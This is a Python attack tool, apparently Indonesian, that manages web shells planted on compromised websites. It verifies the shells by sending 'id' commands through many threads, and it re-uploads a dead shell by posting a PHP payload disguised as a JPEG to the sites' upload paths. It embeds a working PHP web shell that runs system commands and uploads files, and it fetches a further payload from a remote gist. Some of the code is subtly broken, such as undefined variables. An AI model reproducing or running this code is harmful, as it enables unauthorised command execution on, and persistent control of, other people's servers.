#!/usr/bin/env python3
"""
GROOTX SHELL CHECKER v1.0 — Dedicated Shell Verification Tool
===============================================================
Separate tool from main GROOTX exploitation suite.
Fungsi: verifikasi shell.txt, pantau shell alive/dead, retry dead shells.

Fitur:
  - check     : satu kali verifikasi semua shell di shell.txt
  - monitor   : mode monitor terus-menerus (setiap N detik)
  - retry     : coba upload ulang shell yang mati
  - clean     : pisahkan shell alive dan dead ke file terpisah
  - stats     : tampilkan statistik shell

Output:
  - shell_alive.txt    : list shell yang masih aktif
  - shell_dead.txt     : list shell yang mati
  - shell_check_log.json : riwayat pemeriksaan

Usage:
  cd ~/Unduhan/hek/shell_checker
  python3 checker.py check          # verifikasi sekali
  python3 checker.py monitor       # mode monitor kontinu
  python3 checker.py retry         # retry shell mati
  python3 checker.py clean         # pisahkan alive/dead
  python3 checker.py stats         # tampilkan statistik
  python3 checker.py check --threads 50   # dengan thread tertentu
"""

import os
import sys
import json
import time
import hashlib
import threading
import argparse
import urllib3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ──────────────────────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────────────────────
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PARENT_DIR = os.path.dirname(BASE_DIR)  # ~/Unduhan/hek

SHELL_FILE = os.path.join(PARENT_DIR, "shell.txt")
SHELL_ALIVE_FILE = os.path.join(BASE_DIR, "shell_alive.txt")
SHELL_DEAD_FILE = os.path.join(BASE_DIR, "shell_dead.txt")
CHECK_LOG = os.path.join(BASE_DIR, "shell_check_log.json")
SHELL_RESULT = os.path.join(BASE_DIR, "shell_results.json")

THREADS = int(os.environ.get("THREADS", "50"))
TIMEOUT = int(os.environ.get("TIMEOUT", "5"))
MONITOR_INTERVAL = int(os.environ.get("MONITOR_INTERVAL", "30"))
MAX_RETRIES = int(os.environ.get("MAX_RETRIES", "3"))

# Gist shell payload untuk retry upload
GIST_SHELL_ID = os.environ.get("GIST_SHELL_ID", "b66cf0e3ad4b2d3af5b696660c144671")
GIST_URL = f"https://gist.githack.com/{GIST_ID}/raw"

LOCK = threading.Lock()
_write_lock = threading.Lock()

# ──────────────────────────────────────────────────────────────
# SHELL PAYLOAD
# ──────────────────────────────────────────────────────────────
PHP_SHELL = """<?php
if(isset($_REQUEST['cmd'])){echo "<pre>";system($_REQUEST['cmd']);echo "</pre>";}
if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo "OK";}
?>"""

_gist_cache = None

def get_shell_payload():
    global _gist_cache
    if _gist_cache:
        return _gist_cache
    try:
        import requests as _req
        r = _req.get(GIST_URL, timeout=10, verify=False)
        if r.status_code == 200 and len(r.text) > 20:
            _gist_cache = r.text
            return r.text
    except Exception:
        pass
    _gist_cache = PHP_SHELL
    return _gist_cache


# ──────────────────────────────────────────────────────────────
# LOAD SHELLS
# ──────────────────────────────────────────────────────────────
def load_shells():
    """Load shell list dari shell.txt (di parent folder)."""
    if not os.path.exists(SHELL_FILE):
        print(f"[CHECKER] [ERROR] {SHELL_FILE} tidak ditemukan!")
        print(f"[CHECKER] Pastikan menjalankan exploit terlebih dahulu.")
        return []

    with open(SHELL_FILE) as f:
        shells = [l.strip() for l in f if l.strip() and not l.startswith("#")]

    # Deduplicate
    seen = set()
    unique = []
    for s in shells:
        if s not in seen:
            seen.add(s)
            unique.append(s)

    print(f"[CHECKER] Loaded {len(unique)} shells dari shell.txt")
    return unique


def load_processed():
    """Load shells yang sudah pernah dicheck untuk menghindari duplikat."""
    processed = set()
    for fname in [SHELL_ALIVE_FILE, SHELL_DEAD_FILE]:
        fp = os.path.join(BASE_DIR, fname)
        if os.path.exists(fp):
            try:
                with open(fp) as f:
                    for line in f:
                        s = line.strip()
                        if s:
                            processed.add(s)
            except Exception:
                pass
    return processed


# ──────────────────────────────────────────────────────────────
# CHECK RESULT TRACKER
# ──────────────────────────────────────────────────────────────
class CheckTracker:
    def __init__(self):
        self.results = []
        self.lock = threading.Lock()
        self.alive_count = 0
        self.dead_count = 0
        self._load_existing()

    def _load_existing(self):
        if os.path.exists(SHELL_RESULT):
            try:
                with open(SHELL_RESULT) as f:
                    data = json.load(f)
                if isinstance(data, dict):
                    with self.lock:
                        self.alive_count = data.get("alive", 0)
                        self.dead_count = data.get("dead", 0)
                        self.results = data.get("results", [])
            except Exception:
                pass

    def add(self, shell_url, status, response_time=0, http_code=0, details=""):
        entry = {
            "shell": shell_url,
            "status": status,
            "timestamp": datetime.now().isoformat(),
            "response_time": response_time,
            "http_code": http_code,
            "details": details,
        }
        with self.lock:
            self.results.append(entry)
            if status == "ALIVE":
                self.alive_count += 1
            elif status == "DEAD":
                self.dead_count += 1
            # Simpan ke file
            try:
                with _write_lock:
                    data = {
                        "alive": self.alive_count,
                        "dead": self.dead_count,
                        "results": self.results[-10000:],
                    }
                    with open(SHELL_RESULT, "w") as f:
                        json.dump(data, f, indent=2)
            except Exception:
                pass

    def get_counts(self):
        with self.lock:
            return {"alive": self.alive_count, "dead": self.dead_count}

    def print_summary(self):
        c = self.get_counts()
        total = c["alive"] + c["dead"]
        print(f"\n[CHECKER] ═══ SHELL CHECK SUMMARY ═══")
        print(f"  Total shell:  {total}")
        print(f"  [ALIVE]      {c['alive']}")
        print(f"  [DEAD]       {c['dead']}")
        if total > 0:
            print(f"  Tingkat hidup: {c['alive']/total*100:.1f}%")
        print(f"\n  Alive  : {SHELL_ALIVE_FILE}")
        print(f"  Dead   : {SHELL_DEAD_FILE}")
        print(f"  Log    : {SHELL_RESULT}")


tracker = CheckTracker()


# ──────────────────────────────────────────────────────────────
# SHELL CHECK FUNCTION
# ──────────────────────────────────────────────────────────────
def check_shell(shell_url):
    """
    Cek apakah shell masih aktif.
    Return (status, response_time, http_code, details)
    """
    shell_url = shell_url.strip()
    if not shell_url.startswith(("http://", "https://")):
        shell_url = "http://" + shell_url

    start = time.time()
    try:
        import requests as _req
        session = _req.Session()
        session.verify = False
        session.timeout = TIMEOUT

        # Coba akses shell dengan berbagai parameter
        test_params = [
            shell_url,
            f"{shell_url}?cmd=id",
            f"{shell_url}?c=id",
            f"{shell_url}?p=index",
        ]

        for url in test_params:
            try:
                r = session.get(url, timeout=TIMEOUT, allow_redirects=False)
                elapsed = time.time() - start

                if r.status_code == 200 and len(r.text) > 10:
                    # Cek apakah response mengandung output command
                    if "uid=" in r.text or "root" in r.text.lower() or "nt authority" in r.text.lower():
                        return "ALIVE", elapsed, r.status_code, f"uid=0 confirmed ({elapsed:.2f}s)"
                    elif len(r.text) > 50:
                        return "ALIVE", elapsed, r.status_code, f"shell alive ({elapsed:.2f}s)"
                    else:
                        return "ALIVE", elapsed, r.status_code, f"shell responds ({elapsed:.2f}s)"
                elif r.status_code in (301, 302):
                    # Redirect — coba follow
                    continue
            except Exception:
                continue

        # Berusaha lebih keras — coba dengan POST
        try:
            r = session.post(shell_url, data={"cmd": "id"}, timeout=TIMEOUT)
            elapsed = time.time() - start
            if r.status_code == 200 and ("uid=" in r.text or len(r.text) > 20):
                return "ALIVE", elapsed, r.status_code, f"POST shell alive ({elapsed:.2f}s)"
        except Exception:
            pass

        elapsed = time.time() - start
        return "DEAD", elapsed, 0, f"no response ({elapsed:.2f}s)"

    except Exception as e:
        elapsed = time.time() - start
        return "DEAD", elapsed, 0, f"error: {str(e)[:50]}"


# ──────────────────────────────────────────────────────────────
# CHECK ALL SHELLS
# ──────────────────────────────────────────────────────────────
def check_all(shells, threads=THREADS):
    """Verifikasi semua shell, tulis alive/dead ke file terpisah."""
    print(f"\n{'='*60}")
    print(f"[CHECKER] SHELL VERIFICATION")
    print(f"[CHECKER] Threads: {threads} | Timeout: {TIMEOUT}s")
    print(f"[CHECKER] Total shells: {len(shells)}")
    print(f"{'='*60}\n")

    start = time.time()
    processed = load_processed()
    shells_to_check = [s for s in shells if s not in processed]

    if not shells_to_check:
        print("[CHECKER] Semua shell sudah pernah dicek. Menggunakan data yang ada.")
        shells_to_check = shells

    print(f"[CHECKER] Shell yang akan dicek: {len(shells_to_check)}")
    print(f"[CHECKER] Shell yang sudah diproses: {len(processed)}")
    print()

    alive_list = []
    dead_list = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_shell, s): s for s in shells_to_check}
        total = len(futures)

        for i, future in enumerate(as_completed(futures), 1):
            shell = futures[future]
            try:
                status, rt, code, details = future.result()
                tracker.add(shell, status, rt, code, details)

                if status == "ALIVE":
                    alive_list.append(shell)
                    print(f"[CHECKER] [ALIVE] {shell} ({rt:.2f}s)")
                else:
                    dead_list.append(shell)
                    print(f"[CHECKER] [DEAD]  {shell} — {details}")

            except Exception as e:
                dead_list.append(shell)
                tracker.add(shell, "DEAD", 0, 0, str(e)[:50])
                print(f"[CHECKER] [ERROR] {shell} — {str(e)[:50]}")

            if i % 50 == 0 or i == total:
                elapsed = time.time() - start
                c = tracker.get_counts()
                print(f"\r[CHECKER] Progress: {i}/{total} | "
                      f"Alive:{c['alive']} Dead:{c['dead']} | "
                      f"{elapsed:.1f}s", end="", flush=True)

    print()

    # Tulis file terpisah
    if alive_list:
        with open(SHELL_ALIVE_FILE, "w") as f:
            for s in alive_list:
                f.write(s + "\n")
        print(f"[CHECKER] Tulis {len(alive_list)} shell alive ke {SHELL_ALIVE_FILE}")

    if dead_list:
        with open(SHELL_DEAD_FILE, "w") as f:
            for s in dead_list:
                f.write(s + "\n")
        print(f"[CHECKER] Tulis {len(dead_list)} shell dead ke {SHELL_DEAD_FILE}")

    tracker.print_summary()
    elapsed = time.time() - start
    print(f"\n[CHECKER] ═══ CHECK SELESAI dalam {elapsed:.1f}s ═══")


# ──────────────────────────────────────────────────────────────
# RETRY DEAD SHELLS
# ──────────────────────────────────────────────────────────────
def retry_dead(threads=THREADS):
    """Coba upload ulang shell yang mati."""
    print(f"\n{'='*60}")
    print(f"[CHECKER] RETRY DEAD SHELLS")
    print(f"[CHECKER] Threads: {threads}")
    print(f"{'='*60}\n")

    # Load dead shells
    if not os.path.exists(SHELL_DEAD_FILE):
        print(f"[CHECKER] {SHELL_DEAD_FILE} tidak ditemukan. Jalankan 'check' dulu.")
        return

    with open(SHELL_DEAD_FILE) as f:
        dead_shells = [l.strip() for l in f if l.strip()]

    print(f"[CHECKER] Shell mati yang akan dicoba ulang: {len(dead_shells)}")

    # Load payload
    payload = get_shell_payload()

    alive_after_retry = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(retry_single, s, payload): s for s in dead_shells}
        total = len(futures)

        for i, future in enumerate(as_completed(futures), 1):
            shell = futures[future]
            try:
                new_shell = future.result()
                if new_shell:
                    alive_after_retry.append(new_shell)
                    tracker.add(new_shell, "ALIVE", 0, 200, "retry success")
                    print(f"[CHECKER] [RETRY OK] {new_shell}")
                else:
                    tracker.add(shell, "DEAD", 0, 0, "retry failed")
                    print(f"[CHECKER] [RETRY FAIL] {shell}")
            except Exception as e:
                tracker.add(shell, "DEAD", 0, 0, str(e)[:50])
                print(f"[CHECKER] [RETRY ERROR] {shell} — {str(e)[:50]}")

            if i % 20 == 0 or i == total:
                print(f"\r[CHECKER] Retry progress: {i}/{total}", end="", flush=True)

    print()

    # Update shell_alive.txt dengan yang berhasil diretry
    if alive_after_retry:
        existing_alive = []
        if os.path.exists(SHELL_ALIVE_FILE):
            with open(SHELL_ALIVE_FILE) as f:
                existing_alive = [l.strip() for l in f if l.strip()]

        combined = list(set(existing_alive + alive_after_retry))
        with open(SHELL_ALIVE_FILE, "w") as f:
            for s in combined:
                f.write(s + "\n")
        print(f"[CHECKER] Update {SHELL_ALIVE_FILE}: {len(combined)} shells (termasuk {len(alive_after_retry)} dari retry)")

    elapsed = time.time() - start
    print(f"\n[CHECKER] ═══ RETRY SELESAI dalam {elapsed:.1f}s ═══")
    print(f"[CHECKER] Shell berhasil diretry: {len(alive_after_retry)}")


def retry_single(shell_url, payload):
    """Coba upload ulang shell ke target yang mati."""
    shell_url = shell_url.strip()
    if not shell_url.startswith(("http://", "https://")):
        shell_url = "http://" + shell_url

    try:
        import requests as _req
        session = _req.Session()
        session.verify = False
        session.timeout = TIMEOUT + 5

        # Ekstrak base URL dari shell URL
        # Contoh: http:// target.com/shell.php → http://target.com/
        parsed = shell_url.rstrip("/")
        # Coba beberapa pendekatan untuk mendapatkan base URL
        base_urls = [
            parsed.rsplit("/", 1)[0] + "/",
            parsed.rsplit("/", 2)[0] + "/",
        ]

        # Deterministik nama file berdasarkan hash target
        target_hash = hashlib.md5(parsed.encode()).hexdigest()[:8]
        shell_name = f"retry_{target_hash}.php"

        for base in base_urls:
            try:
                # Upload shell baru
                files = {"file": (shell_name, payload, "image/jpeg")}
                r = session.post(base, files=files, timeout=TIMEOUT + 5)
                if r.status_code in (200, 201):
                    # Cek apakah shell berjalan
                    new_shell = f"{base}{shell_name}"
                    rv = session.get(new_shell, timeout=TIMEOUT)
                    if rv.status_code == 200 and len(rv.text) > 10:
                        return new_shell
            except Exception:
                continue

        # Fallback: coba path langsung
        for path in ["/", "/uploads/", "/tmp/", "/images/", "/assets/"]:
            try:
                base = shell_url.rsplit("/", 1)[0] + path
                files = {"file": (shell_name, payload, "image/jpeg")}
                r = session.post(base, files=files, timeout=TIMEOUT + 5)
                if r.status_code in (200, 201):
                    new_shell = f"{base}{shell_name}"
                    rv = session.get(new_shell, timeout=TIMEOUT)
                    if rv.status_code == 200 and len(rv.text) > 10:
                        return new_shell
            except Exception:
                continue

    except Exception:
        pass

    return None


# ──────────────────────────────────────────────────────────────
# CLEAN — Pisahkan alive/dead
# ──────────────────────────────────────────────────────────────
def clean_split():
    """Baca shell.txt dan pisahkan ke alive/dead berdasarkan check terakhir."""
    if not os.path.exists(SHELL_RESULT):
        print(f"[CHECKER] {SHELL_RESULT} tidak ditemukan. Jalankan 'check' dulu.")
        return

    with open(SHELL_RESULT) as f:
        data = json.load(f)

    alive = []
    dead = []
    for entry in data.get("results", []):
        if entry["status"] == "ALIVE":
            alive.append(entry["shell"])
        elif entry["status"] == "DEAD":
            dead.append(entry["shell"])

    if alive:
        with open(SHELL_ALIVE_FILE, "w") as f:
            for s in alive:
                f.write(s + "\n")
        print(f"[CHECKER] Tulis {len(alive)} shell alive → {SHELL_ALIVE_FILE}")

    if dead:
        with open(SHELL_DEAD_FILE, "w") as f:
            for s in dead:
                f.write(s + "\n")
        print(f"[CHECKER] Tulis {len(dead)} shell dead → {SHELL_DEAD_FILE}")

    print(f"\n[CHECKER] ═══ CLEAN SELESAI ═══")
    print(f"  Alive: {len(alive)} | Dead: {len(dead)}")


# ──────────────────────────────────────────────────────────────
# STATS
# ──────────────────────────────────────────────────────────────
def show_stats():
    """Tampilkan statistik shell."""
    print(f"\n{'='*60}")
    print(f"[CHECKER] SHELL STATISTICS")
    print(f"{'='*60}\n")

    # Dari check log
    if os.path.exists(SHELL_RESULT):
        with open(SHELL_RESULT) as f:
            data = json.load(f)
        alive = data.get("alive", 0)
        dead = data.get("dead", 0)
        total = alive + dead
        print(f"[CHECKER] Dari check log:")
        print(f"  Total tercheck: {total}")
        print(f"  Alive: {alive}")
        print(f"  Dead:  {dead}")
        if total > 0:
            print(f"  Tingkat hidup: {alive/total*100:.1f}%")

    # Dari file
    for fname, label in [(SHELL_FILE, "shell.txt (semua)"),
                          (SHELL_ALIVE_FILE, "shell_alive.txt"),
                          (SHELL_DEAD_FILE, "shell_dead.txt")]:
        fp = os.path.join(BASE_DIR, fname) if fname != SHELL_FILE else fname
        if os.path.exists(fp):
            with open(fp) as f:
                count = len([l for l in f if l.strip()])
            print(f"  {label}: {count}")

    # Riwayat terakhir
    if os.path.exists(SHELL_RESULT):
        with open(SHELL_RESULT) as f:
            data = json.load(f)
        results = data.get("results", [])
        if results:
            last_check = results[-1].get("timestamp", "unknown")
            print(f"\n[CHECKER] Check terakhir: {last_check}")

    print(f"\n[CHECKER] File:")
    print(f"  {SHELL_FILE}")
    print(f"  {SHELL_ALIVE_FILE}")
    print(f"  {SHELL_DEAD_FILE}")
    print(f"  {SHELL_RESULT}")


# ──────────────────────────────────────────────────────────────
# MONITOR MODE
# ──────────────────────────────────────────────────────────────
def monitor_mode(threads=THREADS, interval=MONITOR_INTERVAL):
    """Mode monitor kontinu — check setiap N detik."""
    print(f"\n{'='*60}")
    print(f"[CHECKER] MONITOR MODE — kontinu")
    print(f"[CHECKER] Threads: {threads} | Interval: {interval}s")
    print(f"[CHECKER] Tekan Ctrl+C untuk berhenti")
    print(f"{'='*60}\n")

    cycle = 0
    try:
        while True:
            cycle += 1
            print(f"\n{'─'*60}")
            print(f"[CHECKER] Cycle {cycle} — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"{'─'*60}")

            shells = load_shells()
            if not shells:
                print("[CHECKER] Tidak ada shell. Menunggu...")
                time.sleep(interval)
                continue

            check_all(shells, threads=threads)

            print(f"\n[CHECKER] Menunggu {interval}s sebelum cycle berikutnya...")
            print(f"[CHECKER] Tekan Ctrl+C untuk berhenti")
            time.sleep(interval)

    except KeyboardInterrupt:
        print(f"\n[CHECKER] Monitor dihentikan oleh user.")
        tracker.print_summary()


# ──────────────────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="GROOTX SHELL CHECKER v1.0 — Dedicated Shell Verification",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Contoh:
  python3 checker.py check          # verifikasi sekali
  python3 checker.py monitor       # mode monitor kontinu
  python3 checker.py retry         # retry shell mati
  python3 checker.py clean         # pisahkan alive/dead
  python3 checker.py stats         # tampilkan statistik
  python3 checker.py check --threads 100 --timeout 3
        """
    )
    parser.add_argument("command", nargs="?", default="check",
                        help="Command: check, monitor, retry, clean, stats")
    parser.add_argument("--threads", type=int, default=THREADS,
                        help=f"Jumlah thread (default: {THREADS})")
    parser.add_argument("--timeout", type=int, default=TIMEOUT,
                        help=f"Timeout per shell (default: {TIMEOUT}s)")
    parser.add_argument("--interval", type=int, default=MONITOR_INTERVAL,
                        help=f"Interval monitor (default: {MONITOR_INTERVAL}s)")
    parser.add_argument("--cycles", type=int, default=0,
                        help="Jumlah cycle untuk monitor (0 = infinit)")
    args = parser.parse_args()

    cmd = args.command
    threads = args.threads
    timeout = args.timeout
    interval = args.interval

    os.environ["THREADS"] = str(threads)
    os.environ["TIMEOUT"] = str(timeout)

    if cmd == "check":
        shells = load_shells()
        if shells:
            check_all(shells, threads=threads)
    elif cmd == "monitor":
        monitor_mode(threads=threads, interval=interval)
    elif cmd == "retry":
        retry_dead(threads=threads)
    elif cmd == "clean":
        clean_split()
    elif cmd == "stats":
        show_stats()
    else:
        print(f"[CHECKER] Unknown command: {cmd}")
        parser.print_help()


if __name__ == "__main__":
    main()
